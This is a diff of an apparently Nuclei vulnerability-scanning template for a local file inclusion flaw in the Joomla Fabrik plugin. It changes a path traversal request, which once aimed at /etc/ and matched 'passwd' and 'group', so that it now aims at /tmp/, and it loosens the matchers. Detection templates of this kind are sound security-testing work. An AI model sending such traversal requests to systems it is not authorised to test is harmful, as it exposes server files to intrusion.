@@ -4,16 +4,16 @@ http:
     part: body
     type: word
     words:
-    - '"value":"passwd"'
-    - '"value":"group"'
+    - '"value":'
     - '"disable":false'
+    - text
   - status:
     - 200
     type: status
   matchers-condition: and
   method: GET
   path:
-  - '{{BaseURL}}/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../etc/'
+  - '{{BaseURL}}/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/'
 id: joomla-com-fabrik-lfi
 info:
   author: dhiyaneshDk
@@ -28,4 +28,4 @@ info:
   reference:
   - https://www.exploit-db.com/exploits/48263
   severity: high
-  tags: joomla,lfi,edb,vuln
+  tags: joomla,lfi,edb
